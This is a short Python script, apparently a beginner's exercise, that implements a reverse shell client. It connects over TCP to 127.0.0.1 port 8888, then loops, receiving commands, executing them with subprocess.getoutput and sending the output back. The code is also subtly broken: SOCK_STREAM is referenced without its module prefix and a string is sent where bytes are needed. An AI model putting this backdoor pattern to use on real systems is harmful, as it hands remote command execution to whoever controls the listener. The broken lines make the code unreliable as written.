#!/usr/bin/python3
import socket
import subprocess


#we use AF_INET to show we using IPV4 and SOCK_STREAM to show we using TCP 
s=socket.socket(socket.AF_INET,SOCK_STREAM)

s.connect(("127.0.0.1",8888))
print("connected")

#specify it will reciver less than or equal to  1024 bytes and then decode the bytes into string
while True:
    cmd= (s.recv(1024)).decode()  
    output= subprocess.getoutput(cmd)
    s.send(output)


